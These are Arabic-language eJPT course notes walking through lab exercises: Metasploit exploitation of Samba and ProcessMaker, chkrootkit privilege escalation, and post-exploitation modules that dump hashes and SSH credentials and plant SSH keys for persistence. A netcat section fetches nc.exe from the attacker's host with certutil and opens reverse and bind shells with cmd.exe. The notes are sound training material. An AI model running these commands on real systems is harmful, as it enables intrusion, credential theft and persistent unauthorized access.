# Session 8 (ejpt) - Day 8
##  Host & Network Penetration Testing: The Metasploit Framework (MSF) part2

السلام عليكم ورحمة الله وبركاته  

اليوم باذن الله راح نحل اخر لابين في هذا الجزء وراح ندخل على جزء جديد باذن الله  

---  

راح نبداء باللاب الاول الي هو  

Linux: Post Exploitation Lab II 
-------------------------------|  

طبعا في هذا اللاب راح نشوف بعض الموديولز الي ممكن نشغلها بعد اختراق التارقت  

ف راح نشوف بعض الموديولز او اهمها بالاصح ونترك الباقي لكم للي حاب يجربها  
```bash
All Modules of Post Exploitation For Linux  

post/multi/gather/ssh_creds  
post/multi/gather/docker_creds  
post/linux/gather/hashdump  
post/linux/gather/ecryptfs_creds  
post/linux/gather/enum_psk  
post/linux/gather/enum_xchat  
post/linux/gather/phpmyadmin_credsteal  
post/linux/gather/pptpd_chap_secrets  
post/linux/manage/sshkey_persistence  
```  

طبعا بالبداية راح نفحص التارقت وطبعا بما انه ماعطانا ايبي التارقت عندنا خيارين يا نفحص كامل الشبكة او نزيد على اخر ديجت 1  

حنا راح نستخدم الطريقة الثانيه بما انه اسرع  
```bash
nmap -sV -sC 192.91.98.3  
```  

ونشوف انه مقتوح بورت samba 4.1.17وهذا غالبا مصاب بثغرة ولها موديول على الميتاسبلويت خلونا نستغل مباشرة بما انه مكرر  
```bash
use exploit/linux/samba/is_known_pipename  
set RHOST 192.91.98.3  
check  
exploit -z [to exploited and put the session on background]  
```  

والان استغلينا الخدمة وصار معنا سيشن رقمها 1 راح نبدا الان نستخدم بعض الموديولز المميزه والي تفيدنا كثير في هذي النقطه  

خلونا نجرب الان اول موديول معنا  
```bash
use post/multi/gather/ssh_creds  
set SESSION 1  
run  
```  

طبعا هذا الموديول وظيفته يجيب لك مفاتيح ال SSH مثل /root/.ssh/authorized_keys , /root/.ssh/id_rsa , /root/.ssh/id_rsa.pub etc...  


نشوف الموديول الثاني  
```bash
use post/multi/gather/docker_creds  
set SESSION 1  
run  
```  

هذا الموديول الان يفيدنا بانه يعطينا الـ username & password تبع الـ Docker لو كان موجود  

نشوف ثالث موديول  
```bash
use post/linux/gather/hashdump  
set SESSION 1  
set VERBOSE true  
run  
```  

هذا الموديول طبعا يفيدنا بانه يجيب لنا جميع الهاشات حقت النظام مثل ملفات passwd , shadow  

نشوف الموديول الرابع  
```bash
use post/linux/manage/sshkey_persistence  
set SESSION 1  
run  
```  

طبعا هذا اللاب يسوي لنا private key للـ SSH بعد مايشيك على صلاحياته ويضيفه داخل التارقت ويعطينا اياه ونكون نقدر نتصل بالتارقت متى ماحبينا عن طريق الـ SSH باستخدام private key وهذي قد مرت علينا او قد اخذنا تكنيك مسبق وهذا احد تكنيكات الـ Persistence  

طبعا راح يستبدل لنا المفتاح الموجود داخل ملف authorized_kays  


الى هنا انتهى اللاب نشوف الي بعده  

---

راح نبداء باللاب الثاني الي هو  

Establishing Persistence On Linux 
----------------------------------|  

طبعا في هذا اللاب راح نشوف تكنيك Persistence On Linux  

طبعا قد سوينا قبل استغلال لرفع الصلاحيات عن طريق chkrootkit لكن هالمره الهدف انه نسوي Persistence مو انه نرفع صلاحياتنا  

طبعا بالبداية راح نفحص التارقت وطبعا بما انه ماعطانا ايبي التارقت عندنا خيارين يا نفحص كامل الشبكة او نزيد على اخر ديجت 1  

حنا راح نستخدم الطريقة الثانيه بما انه اسرع  
```bash
nmap -sV -sC 192.182.80.3  
```  

حصلنا الـ SSH مفتوح طبعا راح نسجل دخول هو معطينا اليوزر والباسورد في اللاب  

```bash
msfconsole  
use auxiliary/scanner/ssh/ssh_login  
set RHOSTS 192.182.80.3  
set USERNAME jackie  
set PASSWORD password  
run  
```  

طبعا لان قال انه ناجح وانه قدر يدخل وكذالك فتح لنا session راح نجرب ندخل عليه  
```bash
sessions -u 1 [to elevate your session from shell to meterpreter session]  
```  

طبعا الان اخذنا meterpreter session راح الان نشوف موديول الـ chkrootkit  

طبعا لابد ندخل عشان نعرف المسار لكن بنختصر ونفتح الموديول ونكتب المسار علطول لاننا نعرفه  
```bash
use exploit/unix/local/chkrootkit  
set SESSION 2 [select the meterpreter session ID]  
set CHKROOTKIT /bin/chkrootkit  
run  
```  

طبعا الان عطنا الـ session 3 والي هي عن طريق الـ chkrootkit  
راح نحاول نرفعها الى meterpreter session  
```bash
sessions -u 3  
```  

طبعا الان قدرنا نرقيها الى الـ meterpreter session  
الان راح نستخدم الـ sshkey_persistence  

```bash
use post/linux/manage/sshkey_persistence  
set SESSION 4  
set CREATESSHFOLDER true  
exploit  
```  

ونشوف انه اضاف لنا بعض المفاتيح لاكثر من يوزر طبعا نكتب هذا الامر عشان نشوف وين حفظ لنا هذي المفاتيح  

```bash
loot  
```  

نشوف انه عطانا وين حفظهم لنا ونوعهم id_rsa وغيرها من المعلومات ف نقدر نسوي cat الان ونقرا الـ private key بدون مشاكل  

الان نجرب نفتح تاب جديده ونتصل عن طريق الـ SSH باستخدام الـ private key الي سواها لنا الموديول  

طبعا او شي لازم نغير صلاحيات الملف الي فيه المفتاح  
```bash
chmod 0400 ssh_kay  
```  

بعدها ننفذ الامر هذا بحيث نتصل على التارقت عن طريق الـ SSH باستخدام الـ private kay او بالاصح authorized_kays  
```bash
ssh -i ssh_key root@192.182.80.3  
```  

الى هنا انتهى القسم كامل الحمدلله وندخل قسم جديد 
طبعا اتفقنا انه راح نترك جزئية Armitage لضيق الوقت ولانه بالضبط نفس الـ MSFconsole لكن لها واجهة رسومية (GUI) ف بنسكبها وندخل قسم جديد وهو قسم الاستغلال  

---

##  Host & Network Penetration Testing: Exploitation

هذا القسم الجديد خاص بالاستغلال او مركز على الاستغلال وتكنيكات الاستغلال  

---

اول لاب في هذا القسم راح يكون

Netcat Fundamentals 
-------------------|  

طبعا راح نشوف اليوم اداة اسمها netcat وراح نستعرض بعض استخداماتها  
طبعا هذي الاداة لها استخدامات كثير لكن اهمها وهو انه تخليها listener ف عندنا reverse shell , baind shell وراح نشرح الفرق بينهم  

اول شي طبعا معطينا 2 مشين  
الاول حق الـ Attacker والثاني حق الـ Target  

طبعا اول شي ندخل مشين الاتاكر ونشوف انه معطينا ايبي التارقت  

اول شي راح نشوف الاوامر الخاصة بهذي الاداة عن طريق هذا الامر  
```bash
nc --help  
```  


طبعا لو حاولنا نتصل على مثلا جهازنا بالتحديد بورت 80  
```bash
nc 10.10.28.3 80  
```  

طبعا راح يرفض الاتصال لانه بورت 80 على الايبي تبعنا مقفل , راح نجرب نتصل بالتارقت عن طريق مثلا بورت 80  
```bash
nc 10.6.29.169 80  
```  

نشوف انه فعلا اتصل طبعا له اوامر معينه عشان تقدر تتعامل مع بورت 80 مثل الهيدر وبعض الاوامر الاخرى  

طيب خلونا نفحص التارقت نشوف ايش البورتات المفتوحه  
```bash
nmap -sV -sC 10.6.29.169  
```  
نشوف انه عطانا عدد من البورتات المفتوحه طبعا اي اتصال على بورت مقفل راح يرفض  

طيب خلونا الان نستفيد من انه معنا اكسس على التارقت مشين وننقل لها باينري حق الاداة بس بالاول نفتح python server عشان ننقل الملف الى الاتاكر  

خلونا اول شي نروح لماسار الباينري ونفتح السيرفر هناك  
```bash
cd /usr/share/windows-binaries  
```  


عشان نفتح بايثون سيرفر  
```bash
python -m SimpleHTTPServer 80  
```  

والان نتوجه لمشين التارقت عشان نحمل الباينري او حقنا من جهاز الاتاكر طبعا فيه اداة خاصة بالويندوز نفسل اداة wget في لينكس  
```bash
certutil -urlcache -f http://10.10.28.3/nc.exe nc.exe  
```  

طبعا الان انتقلت الاداة تمام طيب خولنا نفتح بورت من جهاز الاتاكر عشان يتصل علينا التارقت  

Attacker machine  
```bash
nc -nvlp 1234  
```  

ونروح الان لمشين التارقت عشان نجرب نتصل على جهاز الاتاكر بنفس البورت الي فتحناه  
```bash
.\nc.exe 10.10.28.3 1234  
```  

نشوف انه الان عطانا الاتصال نرجع لجهاز الاتاكر ونجرب نكتب اي شي بالتيرمنال ونضغط انتر ونشوف انه ماعطانا اي نتيجة ليه هل هذا يعني مافي اتصال ؟ اكيد لا الاتصال موجود والدليل على هذا نرجع لجهاز التارقت ونشوف البورشيل فيها اي شي كتبناه في التيرمنال الي بجهاز الاتاكر  

وهذا يسمى reverse shell  

وهذا يعني ان الاتصال موجود لكن مابعد تعاملنا مع الـ cmd من جهاز الاتاكر الى جهاز التارقت  

ف الان راح نشوف طرق اخرى مع بعض وكيف ممكن تاخذ الشيل وتقدر تنفذ اوامر على جهاز التارقت  

طيب خلونا ننفذ هذا الامر في جهاز الاتاكر  
```bash
echo "Hello, this was sent over with Netcat" >> test.txt  
```  

هذا الامر طبعا نقوله اطبع لنا مابين علامتين التنصيص واضفه داخل ملف test.txt نشوف انه سوا لنا ملف بنفس الاسم ونفس المحتوى  

طيب خلونا الان خلونا نفتح بروت 1234 في جهاز التارقت   
```bash
.\nc.exe -nvlp 1234 > test.txt  
```  

نشوف انه فتح تمام وحنا قلنا له انه افتح هذا البورت واي شي يجي من هذا البورت اضفه في ملف test.txt نلاحظ انه مافي اي ملف اسمه test.txt على جهاز التارقت فقط على جهاز الاتاكر  

الان راح نرسل الملف الي سويناه في جهاز الاتاكر الى جهاز التارقت عن طريق البورت الي مفتوح على جهاز التارقت  
```bash
nc -nv 10.4.20.244 1234 < test.txt  
```  

وهنا قلنا له اتصل بالجهاز الي الايبي تبعه 10.4.20.244 وارسله ملف test.txt ف اول مايتم الاتصال وينجح راح يرسله  الملف فورا الى جهاز التارقت  

ف الان نرجع ونشوف جهاز التارقت نحصل انه فعلا صار عنده ملف اسمه test.txt بنفس المحتوى الملف الي موجود على جهاز الاتاكر  

وهذا يطلق عليه bind Shell  

وفيه اكثر من هذي الخصائص او الفوائد الي ممكن تحصلها من الاداة لكن حنا هنا وضحنا ابرزها او اهمها ان صح التعبير  

الى هنا انتهى اللاب نشوف الي بعده  

---

اللاب الثاني في هذا القسم هو  

Bind Shells
------------|  

طبعا هذا اللاب مقارب لسابق لكن بطريقة اخرى وهي انه بنفذ اوامر عن طريقها بالـ cmd  

اول شي راح نسوي نفس كلشي سابق نفتح بايثون سيرفر وننقل باينري nc.exe الى التارقت مشين  

خلونا اول شي نروح لماسار الباينري ونفتح السيرفر هناك  
```bash
cd /usr/share/windows-binaries  
```  

عشان نفتح بايثون سيرفر  
```bash
python -m SimpleHTTPServer 80  
```  

والان نتوجه لمشين التارقت عشان نحمل الباينري او حقنا من جهاز الاتاكر طبعا فيه اداة خاصة بالويندوز نفسل اداة wget في لينكس  
```bash
certutil -urlcache -f http://10.10.3.2/nc.exe nc.exe  
```  


خلونا اول شي ننتقل الى مسار الي فيه الـ cmd.exe وننقل البانري الي نفس المسار  
```bash
cd C:\Users\Administrator\Downloads  
```  

طيب الان نفتح بورت من التارقت مشين ونقوله اذا صار الاتصال شغلي الـ cmd.exe  

خلونا نشوف كيف بيكون الامر  
```bash
./nc.exe -nvlp 1234 -e cmd.exe  
```  

-e فقط عشان يشغل لنا الملف الي بنحطه مثل الامر الي فوق قلنا له شغلنا cmd.exe اذا صار فيه الاتصال  


الان نحاول نتصل من جهاز الاتاكر على جهاز التارقت  
```bash
nc -nv 10.4.21.221 1234  
```  

ونشوف انه فعلا جا الاتصال لنا وهذا هو يسمى الـ bind shell  

في حال انفتح البورت على التارقت وحنا اتصلنا يعتبر bind shell  
في حال انفتح البورت على جهاز الاتاكر والاتصال كان من التارقت يعتبر reverse shell  

الى هنا انتهى اللاب نشوف الي بعده  

---

اللاب الثالث في هذا القسم هو  

Windows: Workflow Platform
--------------------------|  

طبعا في هذا اللاب راح نستغل برنامج معين اسمه processmaker  

طبعا نشوف انه معطينا التارقت راح نفحصه بداية  
```bash
nmap -sV -sC -vvv -p- 10.0.0.168  
```  

طبعا الي يهمنا منها بورت 80 خلونا ندخل على المتصفح ونفتح الايبي  

نشوف انه عطانا صفحة login طبعا حنا مامعنا لايوزر ولا باسورد راح نبحث نشوف بقوقل هل فيه ديفولت يوزر وباسورد ولا لا  

ف يوم بحثنا بقوقل بالنص هذا 
```bash
processmaker default credentials  
```  

قالنا انه اليوزر والباسورد الديفولت هي  
```bash
username: admin  
password: admin  
```  

نشوف انه سجل لوقن طبعا خلونا نشوف وش اصدار الخدمة هذي  

نلاحظ يسار تحت فيه خيار system information  

ندخله ونشوف انه كاتب لنا اصدار النسخه من هذا البرنامج والاصدار هو 2.5.0 خلونا نبحث عن استغلال في قوقل  
```bash
processmaker 2.5.0 exploi  
```  

ونشوف انه عطانا استغلال معين والي هو هذا  
[exploit](https://www.exploit-db.com/exploits/29325)  

طبعا هذا الاستغلال زي ماهو واضح من موقع الـ exploitdb نشوف انه موجود له موديول على الـ metasploit  

خلونا نستغله الان  
```bash
use exploit/multi/http/processmaker_exec  
set RHOSTS 10.0.0.168  
exploit  
```  

ونشوف انه عطانا meterpreter session  

مطلوب مننا نقرا الفلاق ف ندور عليه ونحصله في اول مسار وهو الـ /  
```bash
cd /  
dir  
cat flag.txt  
```  

الى هنا انتهى اللاب نشوف الي بعده 

---

This labs only read because its repeated
-----------------------------------------|  

1. Port Scanning & Enumeration - Windows  
2. Targeting Microsoft IIS FTP  
3. Targeting OpenSSH  
4. Targeting SMB  
5. Targeting MySQL Database Server  
6. Port Scanning & Enumeration - Linux  
7. Targeting vsFTPd  
8. Targeting PHP (focus on PHP5.2.4-2 maybe get this lab in the CTF)  
9. Targeting SAMBA  
[هنا طبعا دخلنا قسم جديد]  
[Host & Network Penetration Testing: Post-Exploitation]  
10. Enumerating System Information  
 (طبعا هنا اخذنا معلومه انه في حال ماكنت تعرف الـ Architecture تبع النظام وتبي تستغله بتخلي البايلورد 32بت لانه راح يشتغل بكل الحالات سواء كان الجهاز 32بت او 64بت لكن لو خليت البايلود 64بت وكان الجهاز 32بت ماراح يشتغل ففي حال ماكنت تعرف الـ Architecture تختار دائما الـ 32بت لانه بيشتغل في كل الحالات)  
11. Enumerating Users & Groups  
12. Enumerating Network Information  
13. Enumerating Processes & Services   

---  

الى هنا انتهت المحاضره طبعا الـ 13 لاب قريناها فقط لانها متكرره وبسيطه ونفس الخطوات كلها ف اعذروني على التقصير لكن هذا الي مشينا فيه بالدورة حرفيا  


باذن الله نشوفكم بكرا باخر يوم لكورس الـ PTS ;)  

---  

## Follow us on:  
Twitter:  
[s4cript](https://twitter.com/s4cript)  
[cyberhub](https://twitter.com/cyberhub)  
[0xNawaF1](https://twitter.com/0xNawaF1)  
